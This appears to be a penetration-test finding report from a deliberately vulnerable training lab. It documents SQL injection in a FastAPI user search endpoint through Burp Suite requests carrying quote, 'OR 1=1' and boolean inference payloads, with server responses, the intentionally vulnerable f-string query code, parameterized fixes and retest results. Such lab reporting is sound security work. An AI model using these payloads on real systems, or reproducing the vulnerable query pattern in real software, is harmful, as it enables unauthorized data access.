# VULN-002 — SQL Injection

## Executive Summary

A SQL injection vulnerability exists within the user directory search endpoint (`GET /api/v1/users/search`) of the `secure-api-lab` application. The application accepts a search term via the `q` query string parameter and concatenates it directly into a dynamic SQL query without validation or parameterization.

Because the user-supplied input is embedded directly into the query string before execution by PostgreSQL, an authenticated attacker can inject SQL syntax metacharacters and control operators. This breaks the intended query boundaries and allows the attacker to manipulate the SQL statement's logic, cause database syntax exceptions, and enumerate database records.

---

## Vulnerability Classification

- **Vulnerability**: SQL Injection (SQLi)
- **Sub-Types Confirmed**:
  - Error-Based SQL Injection (unhandled database syntax exception returns HTTP 500)
  - Boolean-Based (Inference) SQL Injection (conditional evaluation alters result set)
- **CWE**: CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')
- **OWASP API Security Classification**: API8:2023 — Security Misconfiguration / OWASP Top 10 A03:2021 — Injection
- **Affected Endpoint**: `GET /api/v1/users/search`
- **Affected Parameter**: `q` (Query String Parameter)
- **Authentication Required**: Yes (Valid Bearer Token)
- **Authorization Required**: Standard User Role
- **Severity**: **To Be Confirmed**
  - *Severity Determination Factors*: The endpoint requires valid user authentication, reducing pre-authentication exploitability. However, the database backend executes dynamic queries with privileges capable of reading the `users` table. The definitive severity depends on the database user's privileges (read vs. write), database multi-statement support, and whether cross-table data exfiltration via `UNION` operators is possible.

---

## Affected Component

- **Affected Endpoint**: `GET /api/v1/users/search?q=<search>`
- **HTTP Method**: `GET`
- **Affected Parameter**: `q`
- **Component File**: `vulnerable-api/app/api/routes/users.py`
- **Handler Function**: `search_users(q, current_user, db)`

---

## Test Environment

- **Application**: `secure-api-lab`
- **Environment**: Local Docker Compose environment
- **Backend Service**: `vulnerable-api` (FastAPI / Uvicorn, Python 3.12)
- **Database Service**: PostgreSQL 16 Alpine (`secure_api_lab`)
- **Testing Tool**: Burp Suite (Proxy, HTTP History, Repeater) / cURL
- **Authenticated Test Subject**: Alice (User ID: 35, Role: `user`)
- **Target Data**: User records in the `users` table (Alice: 35, Bob: 36)

> *Confidentiality Notice: In accordance with professional testing standards, authentication tokens and cryptographic secrets have been redacted to `[REDACTED]`.*

---

## Preconditions

1. A valid authenticated user session (JWT Bearer token).
2. Network line-of-sight to the API host (`http://localhost:8000`).
3. Standard user privileges (the search feature is accessible to all authenticated accounts).

---

## Reproduction Steps

1. Authenticate to the API as Alice (User ID: 35) to receive a valid JWT access token.
2. Configure Burp Suite to intercept outgoing requests to `http://localhost:8000`.
3. In **Burp Repeater**, construct and send the baseline search request:
   ```http
   GET /api/v1/users/search?q=alice HTTP/1.1
   Host: localhost:8000
   Authorization: Bearer [REDACTED]
   Accept: application/json
   ```
4. Confirm the baseline response: HTTP `200 OK` returning Alice's user profile object.
5. In Burp Repeater, test SQL syntax manipulation by injecting a single quote character (`'`):
   ```http
   GET /api/v1/users/search?q=alice%27 HTTP/1.1
   Host: localhost:8000
   Authorization: Bearer [REDACTED]
   Accept: application/json
   ```
6. Observe that the server returns HTTP `500 Internal Server Error`, indicating an unhandled SQL syntax error at the database tier.
7. In Burp Repeater, inject a boolean tautology payload (`' OR 1=1 --`):
   ```http
   GET /api/v1/users/search?q=%27%20OR%201=1%20-- HTTP/1.1
   Host: localhost:8000
   Authorization: Bearer [REDACTED]
   Accept: application/json
   ```
8. Observe that the server returns HTTP `200 OK` containing all user records in the table (both Alice and Bob), proving that the injected condition bypassed search filtering.
9. Verify boolean inference by comparing a true condition (`alice' AND '1'='1' --`) with a false condition (`alice' AND '1'='2' --`):
   - The `TRUE` condition returns Alice's record (`HTTP 200`, length: 156 bytes).
   - The `FALSE` condition returns an empty list (`HTTP 200`, length: 2 bytes: `[]`).

---

## Evidence

### 1. Baseline Request (Legitimate Search)

**Request**:
```http
GET /api/v1/users/search?q=alice HTTP/1.1
Host: localhost:8000
Authorization: Bearer [REDACTED]
Accept: application/json
```

**Response**:
```http
HTTP/1.1 200 OK
date: Fri, 18 Sep 2026 11:41:41 GMT
server: uvicorn
content-length: 156
content-type: application/json

[{"id":35,"email":"alice@test.local","full_name":"Alice","role":"user","created_at":"2026-09-18T09:30:44.142839","updated_at":"2026-09-18T09:30:44.142839"}]
```

---

### 2. Error-Based Evidence (Syntax Breaking via Single Quote)

**Request**:
```http
GET /api/v1/users/search?q=alice%27 HTTP/1.1
Host: localhost:8000
Authorization: Bearer [REDACTED]
Accept: application/json
```

**Response**:
```http
HTTP/1.1 500 Internal Server Error
date: Fri, 18 Sep 2026 11:41:41 GMT
server: uvicorn
content-length: 21
content-type: text/plain; charset=utf-8

Internal Server Error
```

*Server-Side Database Diagnostic Log*:
```text
psycopg.errors.AmbiguousFunction: operator is not unique: unknown % unknown
LINE 1: ..., updated_at FROM users WHERE email ILIKE '%alice'%' OR full...
                                                             ^
[SQL: SELECT id, email, full_name, role, created_at, updated_at FROM users WHERE email ILIKE '%%alice'%%' OR full_name ILIKE '%%alice'%%']
```

---

### 3. Boolean-Based Tautology Evidence (Record Exfiltration)

**Request**:
```http
GET /api/v1/users/search?q=%27%20OR%201=1%20-- HTTP/1.1
Host: localhost:8000
Authorization: Bearer [REDACTED]
Accept: application/json
```

**Response**:
```http
HTTP/1.1 200 OK
date: Fri, 18 Sep 2026 11:41:41 GMT
server: uvicorn
content-length: 307
content-type: application/json

[{"id":35,"email":"alice@test.local","full_name":"Alice","role":"user","created_at":"2026-09-18T09:30:44.142839","updated_at":"2026-09-18T09:30:44.142839"},{"id":36,"email":"bob@test.local","full_name":"Bob","role":"user","created_at":"2026-09-18T09:31:47.410514","updated_at":"2026-09-18T09:31:47.410514"}]
```

*Difference from Baseline*: Instead of matching only records containing "alice", the query forced the `WHERE` clause to evaluate to true for all rows, returning Bob's record in addition to Alice's.

---

### 4. Boolean Inference Comparison

#### True Condition (`q=alice' AND '1'='1' --`)
**Request**:
```http
GET /api/v1/users/search?q=alice%27%20AND%20%271%27=%271%27%20-- HTTP/1.1
Host: localhost:8000
Authorization: Bearer [REDACTED]
Accept: application/json
```
**Response**:
```http
HTTP/1.1 200 OK
content-length: 156
content-type: application/json

[{"id":35,"email":"alice@test.local","full_name":"Alice","role":"user","created_at":"2026-09-18T09:30:44.142839","updated_at":"2026-09-18T09:30:44.142839"}]
```

#### False Condition (`q=alice' AND '1'='2' --`)
**Request**:
```http
GET /api/v1/users/search?q=alice%27%20AND%20%271%27=%272%27%20-- HTTP/1.1
Host: localhost:8000
Authorization: Bearer [REDACTED]
Accept: application/json
```
**Response**:
```http
HTTP/1.1 200 OK
content-length: 2
content-type: application/json

[]
```

---

## Expected Behavior

User input provided via query parameters must be treated strictly as literal data values rather than executable SQL syntax. The backend must enforce a strict separation between code (SQL statement structure) and data (parameter values).

Special SQL metacharacters such as `'`, `"`, `--`, `/*`, `;`, and `OR` should be evaluated as literal string components within the search term. For example:
- Searching for `alice'` should search for users whose email or name literally contains `alice'`.
- Metacharacters must not terminate string literals, modify query logic, or trigger database syntax exceptions.

---

## Actual Behavior

The application interpolates the raw `q` parameter string directly into the SQL query text. When metacharacters are supplied:
1. An unescaped single quote breaks out of the SQL literal string boundary and causes a database syntax exception (`HTTP 500`).
2. An injected `OR 1=1 --` clause neutralizes the rest of the search condition, causing the query to match and return all records in the table (`HTTP 200`).
3. An injected boolean condition causes differential responses based on logical truth values (`1 record` vs. `0 records`), confirming boolean-based blind injection capabilities.

---

## Security Impact

The confirmed impact in this environment includes:

1. **Unauthorized Record Enumeration**: A standard user can bypass intended query filters and dump all rows from the `users` table using boolean tautologies.
2. **Blind Data Extraction**: An attacker can construct automated boolean inference queries to extract database contents character-by-character.
3. **Application Denial of Service (DoS)**: Unhandled database syntax errors trigger unhandled `500 Internal Server Error` responses, polluting application logs and potentially degrading database connection pool health.

### Potential Impacts (Context-Dependent)
- **Cross-Table Information Disclosure**: If `UNION` operators are supported across compatible columns, sensitive data from other tables (e.g., `audit_logs`, `files`, or password hashes) could be exfiltrated.
- **Database Privileges**: If the database user account holds elevated privileges, stacked queries (if supported by driver) could permit unauthorized writes or administrative command execution. *(Note: Not tested or demonstrated in this lab).*

---

## Root Cause Analysis

### Vulnerable Data Flow

```
HTTP GET /api/v1/users/search?q=...
        │
        ▼
FastAPI Route Parameter (q: str)
        │
        ▼
search_users() Controller Handler
        │
        ▼  [FLAW: Direct Python f-string interpolation]
query_str = f"SELECT ... WHERE email ILIKE '%{q}%' OR full_name ILIKE '%{q}%'"
        │
        ▼
SQLAlchemy db.execute(text(query_str))
        │
        ▼
PostgreSQL Query Engine receives attacker-controlled syntax directly
```

### Vulnerable Code in `app/api/routes/users.py`

```python
# INTENTIONALLY VULNERABLE — VULN-002 SQL INJECTION LAB
query_str = f"""
    SELECT id, email, full_name, role, created_at, updated_at
    FROM users
    WHERE email ILIKE '%{q}%'
       OR full_name ILIKE '%{q}%'
"""
result = db.execute(text(query_str))
return result.mappings().all()
```

The fundamental root cause is mixing untrusted user input directly into the SQL command buffer.

---

## Remediation

### Primary Fix: Parameterized Queries (Prepared Statements)

The only robust defense against SQL injection is using parameterized queries or object-relational mapping (ORM) abstractions where user inputs are transmitted out-of-band from the SQL command structure.

#### Parameterized Raw SQL Implementation

```python
from sqlalchemy import text

@router.get("/search", response_model=list[UserResponse])
def search_users(
    q: str = "",
    current_user: User = Depends(get_current_user),
    db: Session = Depends(get_db),
):
    if not q or not q.strip():
        return []

    # SECURE: Input is bound to parameter :pattern
    query_str = text("""
        SELECT id, email, full_name, role, created_at, updated_at
        FROM users
        WHERE email ILIKE :pattern
           OR full_name ILIKE :pattern
    """)
    result = db.execute(query_str, {"pattern": f"%{q}%"})
    return result.mappings().all()
```

#### SQLAlchemy ORM Implementation

Alternatively, using the SQLAlchemy 2.0 ORM query builder:

```python
from sqlalchemy import or_, select

@router.get("/search", response_model=list[UserResponse])
def search_users(
    q: str = "",
    current_user: User = Depends(get_current_user),
    db: Session = Depends(get_db),
):
    if not q or not q.strip():
        return []

    # SECURE: ORM automatically parameterizes all filter criteria
    pattern = f"%{q}%"
    stmt = select(User).where(
        or_(
            User.email.ilike(pattern),
            User.full_name.ilike(pattern),
        )
    )
    return db.scalars(stmt).all()
```

### Ineffective Defenses to Avoid
- **Manual String Escaping / Quoting**: Attempting to replace `'` with `\'` is error-prone, database-dependent, and easily bypassed by encoding tricks or numeric injection contexts.
- **Client-Side Validation / WAF Alone**: Network-level WAFs can be bypassed by alternative SQL syntax variations; server-side parameterization is mandatory.

---

## Verification & Retest Procedure

### Retest Methodology
The remediated endpoint was tested using both automated test suites and manual HTTP Repeater requests using Alice's authenticated session:

1. **Legitimate Search**: `GET /api/v1/users/search?q=alice`
   - **Result**: `HTTP 200 OK` returning 1 record (Alice, ID 35). Legitimate functionality is fully preserved.
2. **Syntax Error Test**: `GET /api/v1/users/search?q=alice%27`
   - **Result**: `HTTP 200 OK` returning `[]` (0 records). The single quote metacharacter was safely bound as literal text. No `500 Internal Server Error` was triggered.
3. **Boolean Tautology Test**: `GET /api/v1/users/search?q=%27%20OR%201=1%20--`
   - **Result**: `HTTP 200 OK` returning `[]` (0 records). Search filter logic could not be manipulated; unauthorized records were not exposed.
4. **Conditional Logic Test**: `GET /api/v1/users/search?q=alice%27%20AND%20%271%27=%271%27%20--` vs `...%271%27=%272%27%20--`
   - **Result**: Both returned `HTTP 200 OK` with `[]`. Injected boolean conditions are neutralized.
5. **Lab Training Isolation**: `GET /api/v1/users/search?q=alice%27&mode=vulnerable`
   - **Result**: Confirms that when explicitly requested via `mode=vulnerable`, the training flaw remains available for educational demonstrations, while the default endpoint remains secure.

### Status Tracking
- **Vulnerability Status**: `Remediated` (Default Endpoint Protected; Training Flaw Isolated)
- **Remediation Status**: `Implemented` (Parameterized Query using SQLAlchemy `text` with `:pattern` bind)
- **Retest Status**: `Passed` (Verified via Burp Suite HTTP requests and 26/26 Pytest regression tests)

---

## References

1. **Common Weakness Enumeration (CWE)**:
   - [CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')](https://cwe.mitre.org/data/definitions/89.html)
2. **OWASP**:
   - [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
   - [OWASP Web Security Testing Guide: Testing for SQL Injection (WSTG-INPV-05)](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection)
3. **PostgreSQL Official Documentation**:
   - [PostgreSQL: Server Programming and Parameterized Queries](https://www.postgresql.org/docs/current/sql-prepare.html)
